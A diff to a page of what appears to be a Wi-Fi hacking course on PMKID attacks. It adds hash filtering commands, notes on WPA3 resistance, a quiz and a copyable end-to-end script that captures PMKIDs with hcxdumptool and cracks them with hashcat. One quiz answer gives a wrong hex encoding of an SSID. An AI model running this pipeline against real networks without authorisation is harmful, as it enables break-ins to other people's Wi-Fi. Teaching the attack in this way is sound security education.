@@ -146,6 +146,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -407,7 +428,130 @@
       </div>
     </section>
 
-    <!-- Section 5: Countermeasures -->
+    <!-- Section 5: Hash Analysis & Filtering -->
+    <section id="hashtools">
+      <h2><span class="section-num">05</span> Hash Analysis, Filtering &amp; Verification</h2>
+      <p>After conversion, use these commands to inspect, filter, and verify your captures before cracking.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">hcxhashtool, SSID filtering, wpa_passphrase verification</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-hashtools')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-hashtools"><span class="cmt"># Pre-conversion summary (check what's in the pcapng)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">--info</span> capture.pcapng</span>
+<span class="out-ok">networks with PMKID  : 11    ← 11 PMKIDs captured</span>
+<span class="out-ok">networks with EAPOL  : 3     ← 3 handshakes also captured</span>
+
+<span class="cmt"># Analyze hash file contents with hcxhashtool</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxhashtool <span class="flag">-i</span> hashes.hc22000 <span class="flag">--info</span>=stdout</span>
+<span class="out">type 01 (PMKID):  11 hashes</span>
+<span class="out">type 02 (EAPOL):  3 hashes</span>
+<span class="out">total:            14 hashes</span>
+
+<span class="cmt"># Filter hashes by SSID — extract only target network</span>
+<span class="cmt"># Step 1: Get hex-encoded SSID</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">echo <span class="flag">-n</span> <span class="str">"MyHomeNetwork"</span> | xxd <span class="flag">-p</span></span>
+<span class="out-ok">4d79486f6d654e6574776f726b</span>
+
+<span class="cmt"># Step 2: Filter hash file for that SSID only</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">grep <span class="str">"4d79486f6d654e6574776f726b"</span> hashes.hc22000 > target.hc22000</span>
+<span class="out-ok">1 hash extracted for MyHomeNetwork</span>
+
+<span class="cmt"># Extract PMKID-only hashes (WPA*01*)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">grep <span class="str">"WPA\*01\*"</span> hashes.hc22000 > pmkid_only.hc22000</span>
+
+<span class="cmt"># Verify a recovered password against the PMKID</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">wpa_passphrase <span class="str">"MyHomeNetwork"</span> <span class="str">"Summer2024!"</span></span>
+<span class="out">network={</span>
+<span class="out">    ssid="MyHomeNetwork"</span>
+<span class="out-ok">    psk=a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9</span>
+<span class="out">}</span>
+<span class="cmt"># Use this PSK hex to verify against the captured hash manually</span></div>
+      </div>
+    </section>
+
+    <!-- Section 6: WPA3 Immunity + End-to-End Script -->
+    <section id="wpa3-script">
+      <h2><span class="section-num">06</span> WPA3 Immunity &amp; End-to-End Script</h2>
+
+      <h3>Why WPA3-SAE Is Immune to PMKID Attacks</h3>
+      <p>
+        WPA3-SAE (Dragonfly) uses <strong>Simultaneous Authentication of Equals</strong> — a fundamentally
+        different key exchange. Unlike WPA2-PSK:
+      </p>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Property</th><th>WPA2-PSK</th><th>WPA3-SAE</th></tr></thead>
+          <tbody>
+            <tr><td>Key derivation</td><td>PMK = PBKDF2(passphrase, SSID)</td><td>PMK derived via Dragonfly EKE — includes AP and client in exchange</td></tr>
+            <tr><td>PMKID in EAPOL</td><td>Yes — directly crackable</td><td>No fixed PMKID — SAE derives a unique PMK per session</td></tr>
+            <tr><td>Offline dictionary attack</td><td>Fully possible</td><td>Not possible — forward secrecy; each session PMK is unique</td></tr>
+            <tr><td>Dragonblood side-channel</td><td>N/A</td><td>Partial — timing attacks on SAE commit (CVE-2019-9494)</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout tip">
+        <span class="ci">&#128274;</span>
+        <div><strong>Summary:</strong> WPA3-SAE prevents PMKID cracking because the PMK is never purely derived from <code>passphrase + SSID</code> alone — the Dragonfly exchange includes interactive session parameters that cannot be extracted passively from a single association frame.</div>
+      </div>
+
+      <h3>End-to-End Attack Script</h3>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">pmkid-attack.sh — full pipeline in one script</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-script')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-script"><span class="cmt">#!/bin/bash</span>
+<span class="cmt"># pmkid-attack.sh — Full PMKID capture and crack pipeline</span>
+<span class="cmt"># Usage: sudo ./pmkid-attack.sh wlan0 "TargetSSID" /path/to/wordlist.txt</span>
+
+<span class="out">IFACE=${1:-wlan0}</span>
+<span class="out">TARGET_SSID=${2:-""}</span>
+<span class="out">WORDLIST=${3:-/usr/share/wordlists/rockyou.txt}</span>
+<span class="out">OUTFILE="pmkid_$(date +%Y%m%d_%H%M%S)"</span>
+
+<span class="cmt"># Step 1: Stop interfering services</span>
+<span class="out">echo "[*] Stopping NetworkManager..."</span>
+<span class="out">systemctl stop NetworkManager wpa_supplicant</span>
+
+<span class="cmt"># Step 2: Capture for 60 seconds</span>
+<span class="out">echo "[*] Capturing PMKIDs (60s)..."</span>
+<span class="out">timeout 60 hcxdumptool -i "$IFACE" -o "${OUTFILE}.pcapng" --enable_status=1</span>
+
+<span class="cmt"># Step 3: Convert to hashcat format</span>
+<span class="out">echo "[*] Converting capture..."</span>
+<span class="out">hcxpcapngtool -o "${OUTFILE}.hc22000" "${OUTFILE}.pcapng"</span>
+<span class="out">echo "[+] Hashes: $(wc -l < "${OUTFILE}.hc22000")"</span>
+
+<span class="cmt"># Step 4: Filter to target SSID if specified</span>
+<span class="out">if [ -n "$TARGET_SSID" ]; then</span>
+<span class="out">    SSID_HEX=$(echo -n "$TARGET_SSID" | xxd -p)</span>
+<span class="out">    grep "$SSID_HEX" "${OUTFILE}.hc22000" > "${OUTFILE}_target.hc22000"</span>
+<span class="out">    echo "[+] Filtered to: $TARGET_SSID ($SSID_HEX)"</span>
+<span class="out">    HASHFILE="${OUTFILE}_target.hc22000"</span>
+<span class="out">else</span>
+<span class="out">    HASHFILE="${OUTFILE}.hc22000"</span>
+<span class="out">fi</span>
+
+<span class="cmt"># Step 5: Crack with hashcat</span>
+<span class="out">echo "[*] Cracking with hashcat -m 22000..."</span>
+<span class="out">hashcat -m 22000 "$HASHFILE" "$WORDLIST" -r /usr/share/hashcat/rules/best64.rule -O</span>
+
+<span class="cmt"># Step 6: Show results</span>
+<span class="out">echo "[*] Results:"</span>
+<span class="out">hashcat -m 22000 "$HASHFILE" --show</span>
+
+<span class="cmt"># Step 7: Restore networking</span>
+<span class="out">systemctl start NetworkManager</span>
+<span class="out">echo "[+] Done. NetworkManager restarted."</span></div>
+      </div>
+    </section>
+
+    <!-- Section 7: Countermeasures -->
     <section id="countermeasures">
       <h2><span class="section-num">05</span> Detection &amp; Countermeasures</h2>
 
@@ -432,6 +576,124 @@
       </div>
     </section>
 
+    <!-- Section 8: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">08</span> Knowledge Check</h2>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 12 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">Write the PMKID derivation formula and identify what the attacker knows vs. what they need to crack.</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)"><code>PMKID = PBKDF2(PMK, AP_MAC, Client_MAC)</code> — attacker knows AP_MAC but must crack Client_MAC</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)"><code>PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)</code> — attacker knows all inputs except the passphrase (which produces the PMK)</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)"><code>PMKID = SHA256(SSID || passphrase || AP_MAC)</code> — attacker must brute-force the SSID</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)"><code>PMKID = AES-128(PTK, "PMK Name")</code> — derived from the PTK, not the PMK</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">Why does <code>hcxdumptool</code> NOT require the interface to be in monitor mode before running?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because hcxdumptool only captures broadcast frames which don't require monitor mode</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">hcxdumptool manages the interface mode internally — it puts the interface into the required mode itself. Pre-enabling monitor mode can actually cause conflicts with hcxdumptool's internal driver management</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because the PMKID is transmitted in the Beacon frame body which is available in managed mode</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">hcxdumptool uses a different capture method based on raw sockets, not the 802.11 monitor interface</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">What is the difference between <code>WPA*01*</code> and <code>WPA*02*</code> lines in a <code>.hc22000</code> hash file?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">WPA*01* = WPA1 (TKIP) hashes; WPA*02* = WPA2 (CCMP) hashes</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">WPA*01* = first AP found; WPA*02* = second AP found in the capture</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">WPA*01* = PMKID hash (clientless — from association response); WPA*02* = EAPOL handshake hash (requires client connection). hashcat -m 22000 cracks both types from the same file</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">WPA*01* = successful capture; WPA*02* = partial capture (incomplete handshake)</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">You want to filter <code>hashes.hc22000</code> to only include hashes for the network "CorpWifi". What is the correct approach?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)"><code>grep "CorpWifi" hashes.hc22000 > target.hc22000</code></button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">Convert SSID to hex first: <code>echo -n "CorpWifi" | xxd -p</code> → then: <code>grep "&lt;hex_result&gt;" hashes.hc22000 > target.hc22000</code> (SSIDs are stored as hex in the hash format)</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)"><code>hcxpcapngtool --essid "CorpWifi" -o target.hc22000 capture.pcapng</code></button>
+            <button class="option-btn" onclick="answer(this,'q4',false)"><code>hashcat -m 22000 hashes.hc22000 --ssid "CorpWifi" rockyou.txt</code></button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">Why is cracking a PMKID computationally identical to cracking a traditional WPA2 EAPOL handshake?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">It isn't — PMKID uses SHA256 while EAPOL uses SHA1, making PMKID faster</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">Both require deriving the PMK from the passphrase using PBKDF2-HMAC-SHA1 with 4096 iterations per candidate — that's the bottleneck. The PMKID and EAPOL MIC are just different downstream computations from the same PMK</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">PMKID cracking is 10x faster because it only requires the first 16 bytes of the PMK</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">EAPOL cracking is faster because it doesn't need the SSID as a salt</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">Why is WPA3-SAE immune to PMKID offline dictionary attacks?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">WPA3-SAE uses AES-256 instead of AES-128, making the PMKID too large to crack</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">WPA3 mandates PMF which encrypts the PMKID in the association response</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">WPA3-SAE uses the Dragonfly key exchange where the PMK is derived interactively from both parties — it is not purely derivable from passphrase + SSID + public data. Each session produces a unique PMK, preventing offline computation</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">WPA3 does not include a PMKID field in its association frames</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">What does <code>hcxdumptool --filtermode=2 --filterlist_ap=targets.txt</code> do compared to <code>--filtermode=1</code>?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">filtermode=2 captures 2 PMKIDs per AP; filtermode=1 captures only 1</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">filtermode=2 is whitelist mode — only interact with APs listed in the file. filtermode=1 is blacklist mode — interact with all APs EXCEPT those listed. Whitelist is used for targeted single-AP captures</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">filtermode=2 enables active probing; filtermode=1 is passive-only mode</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">filtermode=2 filters by channel; filtermode=1 filters by BSSID</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">After recovering the passphrase "Password1!" with hashcat, what is the strongest available countermeasure to prevent future PMKID attacks?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)">Enable MAC address filtering on the router</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">Enable 802.11w (PMF) to encrypt the PMKID in association responses</button>
+            <button class="option-btn" onclick="answer(this,'q8',true)">Migrate to WPA3-SAE (Dragonfly) — it eliminates offline dictionary attacks entirely. Alternatively, use a 20+ character random passphrase to make cracking computationally infeasible regardless of attack method</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">Disable PMKID caching in the router settings (prevents fast roaming)</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <div class="nav-footer">
       <a href="../module-11-wps-attacks/" class="nav-btn prev">&#8592; Module 11: WPS Attacks</a>
       <a href="../module-13-enterprise-wpa/" class="nav-btn next">Module 13: WPA-Enterprise &#8594;</a>
@@ -440,6 +702,78 @@
 </div>
 
 <script>
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. PMKID = HMAC-SHA1-128(PMK, 'PMK Name' || AP_MAC || Client_MAC). The attacker captures the PMKID from the association response. They know AP_MAC (from beacon), Client_MAC (their own adapter MAC), and 'PMK Name' (constant string). The only unknown is the passphrase → which produces the PMK via PBKDF2. Brute-forcing candidate passphrases and comparing computed PMKIDs to the captured one is exactly what hashcat -m 22000 does.",
+      wrong: "Incorrect. PMKID = HMAC-SHA1-128(PMK, 'PMK Name' || AP_MAC || Client_MAC). The PMK = PBKDF2(passphrase, SSID, 4096). Attacker knows: AP_MAC, Client_MAC (their own), 'PMK Name' (constant), captured PMKID. Unknown: passphrase → brute-forced."
+    },
+    q2: {
+      correct: "Correct. hcxdumptool has its own internal interface management — it handles the mode switch, channel hopping, and frame injection internally. Pre-setting monitor mode manually can conflict with hcxdumptool's driver calls. The README and official documentation both state: do NOT put the interface in monitor mode before running hcxdumptool.",
+      wrong: "Incorrect. hcxdumptool manages the wireless interface internally. You should NOT pre-enable monitor mode with airmon-ng — this can cause conflicts. Just pass the native interface name (e.g., wlan0, not wlan0mon) and hcxdumptool handles everything else."
+    },
+    q3: {
+      correct: "Correct. In hashcat's .hc22000 format: WPA*01* = PMKID hash (type 01 = clientless, from AP's association response); WPA*02* = EAPOL handshake hash (type 02 = requires client). hashcat -m 22000 handles both types simultaneously in the same crack session — you don't need to separate them.",
+      wrong: "Incorrect. The type field in .hc22000: WPA*01* = PMKID (captured passively from AP, no client needed). WPA*02* = EAPOL handshake (captured from client authentication). hashcat -m 22000 processes both types from the same file."
+    },
+    q4: {
+      correct: "Correct. The .hc22000 format stores SSIDs as hexadecimal. 'CorpWifi' as hex = 436f72705769666920 (from xxd -p). Simple grep for the plaintext SSID string won't work. You must first convert to hex then grep that value.",
+      wrong: "Incorrect. SSIDs in .hc22000 files are hex-encoded. grep 'CorpWifi' won't match. You must: echo -n 'CorpWifi' | xxd -p → get hex → grep that hex string in the hash file."
+    },
+    q5: {
+      correct: "Correct. The computational bottleneck is always PBKDF2-HMAC-SHA1 with 4096 iterations — this converts a candidate passphrase into a PMK. Whether you're then computing an EAPOL MIC (handshake cracking) or a PMKID (PMKID cracking), the 4096× SHA1 per candidate is what limits speed. The final HMAC-SHA1 or HMAC-SHA1-128 step is negligible by comparison.",
+      wrong: "Incorrect. Both PMKID and EAPOL cracking require the same bottleneck: PBKDF2-HMAC-SHA1(passphrase, SSID, 4096 iterations) → PMK. This 4096-iteration hash is what makes WPA2 cracking slow, regardless of whether you're verifying against a PMKID or an EAPOL MIC. The cipher or hash size difference is negligible."
+    },
+    q6: {
+      correct: "Correct. WPA3-SAE uses the Dragonfly Password Authenticated Key Exchange. The PMK derivation is not a simple one-way function of passphrase + SSID — it includes an interactive commit/confirm exchange where both parties contribute fresh random values. The resulting PMK cannot be derived from any passively captured data alone, making offline dictionary attacks impossible.",
+      wrong: "Incorrect. WPA3-SAE (Dragonfly/SAE) derives the PMK through an interactive key exchange that includes fresh random contributions from both parties in each session. The PMK cannot be computed offline from just the passphrase + SSID + any captured packet — it requires live interaction with the AP, making offline cracking impossible."
+    },
+    q7: {
+      correct: "Correct. filtermode=2 = whitelist = 'interact ONLY with APs in the list'. filtermode=1 = blacklist = 'interact with ALL APs EXCEPT those in the list'. For a targeted single-AP assessment, filtermode=2 with the target BSSID limits traffic, reduces noise, and focuses capture on the intended target.",
+      wrong: "Incorrect. filtermode=2 = whitelist (ONLY interact with listed BSSIDs). filtermode=1 = blacklist (interact with ALL except listed). Active probing is controlled by --active_beacon, not filtermode. Channel filtering is a separate parameter."
+    },
+    q8: {
+      correct: "Correct. WPA3-SAE eliminates offline dictionary attacks entirely by changing the key derivation model. A 20+ character random passphrase (letters, digits, symbols) with ~100+ bits of entropy is the best WPA2 option — at ~1.2M H/s on an RTX 4090, it would take vastly longer than the age of the universe to exhaust. MAC filtering is trivially bypassed by MAC spoofing.",
+      wrong: "Incorrect. PMF (802.11w) does NOT encrypt the PMKID — it protects deauth/disassoc management frames. PMKID is included in EAPOL frames, not managed by PMF. The correct mitigations: WPA3-SAE (eliminates offline attack entirely) or a strong random passphrase (makes cracking computationally infeasible)."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 13!' : pct >= 0.75 ? 'Strong — review missed questions.' : pct >= 0.5 ? 'Getting there — re-read the PMKID formula and hash format sections.' : 'Re-read the derivation math, hcxdumptool interface notes, and WPA3 immunity sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
+  }
+
   function copyTerm(btn, id) {
     const el = document.getElementById(id);
     navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
